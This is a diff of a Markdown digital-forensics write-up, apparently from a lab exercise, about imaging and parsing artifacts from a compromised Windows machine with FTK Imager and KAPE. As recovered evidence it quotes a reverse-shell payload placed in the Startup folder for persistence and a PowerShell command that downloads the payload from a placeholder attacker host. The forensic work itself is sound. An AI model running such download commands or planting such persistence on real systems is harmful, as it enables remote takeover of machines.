@@ -17,9 +17,7 @@ In this second phase, I approached the same machine from a forensic analyst’s 
 
 ---
 
-## WALKTHROUGH:
-
-## ARTIFACT ACQUISITION
+## - ARTIFACT ACQUISITION
 I started by using FTK Imager to collect both targeted and broad artifacts:
 | Artifact                | Path                                                            |
 | ----------------------- | --------------------------------------------------------------- |
@@ -34,12 +32,12 @@ I used FTK Imager to create a disk image `.001`, consolidating these artifacts, 
 
 ---
 
-## EVIDENCE TRANSFER
+## - EVIDENCE TRANSFER
 I securely copied the `.001` disk image from the compromised Windows system to my dedicated forensics workstation.
 
 ---
 
-## EXAMINING THE DISK IMAGE
+## - EXAMINING THE DISK IMAGE
 On my forensics machine:
 
 - I loaded the `.001` image back into FTK Imager.
@@ -47,7 +45,7 @@ On my forensics machine:
 
 ---
 
-## PARSING THE ARTIFACTS
+## - PARSING THE ARTIFACTS
 Next, I launched KAPE (Kroll Artifact Parser and Extractor), pointed it to the extracted image contents, and configured it:
 - Selected key targets (like registry hives, event logs, MFT).
 - Selected modules to parse this data into structured outputs.
@@ -69,6 +67,7 @@ Through this analysis, I found clear artifacts of the attack:
 
 - Persistence:
   - Located the reverse shell payload copied to the Windows startup folder.
+    
     Example:
     ```
     C:\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\payload.pyzw
@@ -81,6 +80,7 @@ Through this analysis, I found clear artifacts of the attack:
 - Command line evidence in Event Logs:
   - Found PowerShell and cmd commands in the Security/PowerShell logs.
   - Notably recovered the command that downloaded the payload:
+    
     ```batch
     powershell -Command "Invoke-WebRequest -Uri http://<attacker_IP>/powershell_reverse.pyzw -OutFile C:\Users\Public\Documents\powershell_reverse.pyzw"
     ```
